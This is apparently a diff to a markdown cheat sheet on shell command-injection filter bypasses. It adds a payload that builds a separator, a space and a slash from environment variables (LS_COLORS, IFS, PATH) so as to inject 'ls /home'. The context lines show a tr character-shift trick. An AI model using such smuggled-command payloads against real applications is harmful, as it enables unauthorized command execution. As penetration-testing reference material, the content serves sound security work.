@@ -60,3 +60,9 @@ man ascii
 echo $(tr '!-}' '"-~'<<<[)
 ```
 - [ has ascii #91, so one shift to the right is \
+
+
+Payload for (; /n ls /home)
+```
+${LS_COLORS:10:1}%0als${IFS}${PATH:0:1}home
+```
